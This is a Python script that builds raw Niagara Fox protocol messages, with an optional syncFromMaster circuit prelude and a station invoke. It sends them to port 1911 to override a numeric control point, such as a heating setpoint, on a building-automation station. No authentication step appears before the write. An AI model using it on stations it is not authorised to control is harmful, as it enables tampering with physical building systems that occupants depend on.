#!/usr/bin/env python3
from __future__ import annotations

import argparse
import random
import socket
import time


def _build_fox_message(kind: str, msg_id: int, status: int, op: str, body: str) -> str:
    return f"fox {kind} {msg_id} {status} {op}\n{{\n{body}\n}};;\n"


def _build_sync_open(msg_id: int, circuit_id: int) -> str:
    body = f"id=i:{circuit_id}\nchannel=s:station\ncommand=s:syncFromMaster"
    return _build_fox_message("a", msg_id, -1, "circuit open", body)


def _build_sync_stream(msg_id: int, circuit_id: int) -> str:
    body = f"id=i:{circuit_id}\ndata=b:3[{{\n}}]"
    return _build_fox_message("a", msg_id, -1, "circuit stream", body)


def _build_sync_close(msg_id: int, circuit_id: int) -> str:
    body = f"id=i:{circuit_id}"
    return _build_fox_message("a", msg_id, -1, "circuit close", body)


def _build_station_invoke(msg_id: int, ord_path: str, action: str, value: float) -> str:
    value_text = str(float(value))
    bog_xml = (
        '<bog version="1.0">\n'
        '<p m="c=control" t="c:NumericOverride">\n'
        f' <p n="value" v="{value_text}"/>\n'
        "</p>\n"
        "</bog>\n"
    )
    bog_wire = f"o:bog {len(bog_xml.encode('utf-8'))}[{bog_xml}]"
    body = (
        f"ord=s:{ord_path}\n"
        f"action=s:{action}\n"
        f"arg={bog_wire}"
    )
    return _build_fox_message("s", msg_id, 0, "station invoke", body)


def _send_and_recv(host: str, port: int, messages: list[str], timeout: float, recv_window: float) -> str:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        for message in messages:
            payload = message.encode("utf-8")
            sock.sendall(payload)
            time.sleep(0.05)

        end = time.time() + recv_window
        chunks: list[bytes] = []
        while time.time() < end:
            try:
                data = sock.recv(65535)
            except TimeoutError:
                break
            if not data:
                break
            chunks.append(data)

        return b"".join(chunks).decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Send a raw Niagara Fox station invoke payload (override NumericOverride) to tcp/1911."
    )
    parser.add_argument("--host", required=True, help="Niagara host/IP")
    parser.add_argument("--port", type=int, default=1911, help="Fox port (default: 1911)")
    parser.add_argument(
        "--ord",
        required=True,
        help="Station ORD path without leading s:, e.g. station:|slot:/Drivers/.../OccupiedHeatingSetpoint",
    )
    parser.add_argument("--action", default="override", help="Action name (default: override)")
    parser.add_argument("--value", type=float, required=True, help="Numeric override value")
    parser.add_argument(
        "--message-id",
        type=int,
        default=random.randint(12000, 65000),
        help="Starting Fox message id",
    )
    parser.add_argument(
        "--circuit-id",
        type=int,
        default=random.randint(9000, 9900),
        help="Circuit id used when --sync-prelude is set",
    )
    parser.add_argument(
        "--sync-prelude",
        action="store_true",
        help="Send circuit open/stream/close syncFromMaster messages before invoke",
    )
    parser.add_argument(
        "--recv-window",
        type=float,
        default=2.0,
        help="Seconds to collect response bytes after send (default: 2.0)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Socket timeout seconds (default: 3.0)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print payload(s) only; do not connect/send",
    )
    args = parser.parse_args()

    msg_id = int(args.message_id)
    messages: list[str] = []
    if args.sync_prelude:
        messages.append(_build_sync_open(msg_id, args.circuit_id))
        msg_id += 1
        messages.append(_build_sync_stream(msg_id, args.circuit_id))
        msg_id += 1
        messages.append(_build_sync_close(msg_id, args.circuit_id))
        msg_id += 1
    messages.append(_build_station_invoke(msg_id, args.ord, args.action, args.value))

    print("# outbound fox payloads")
    for idx, payload in enumerate(messages, start=1):
        print(f"--- payload {idx} ---")
        print(payload, end="" if payload.endswith("\n") else "\n")

    if args.dry_run:
        return 0

    response = _send_and_recv(
        host=args.host,
        port=args.port,
        messages=messages,
        timeout=max(0.1, float(args.timeout)),
        recv_window=max(0.1, float(args.recv_window)),
    )

    print("# inbound response")
    if response.strip():
        print(response)
    else:
        print("(no response bytes captured)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
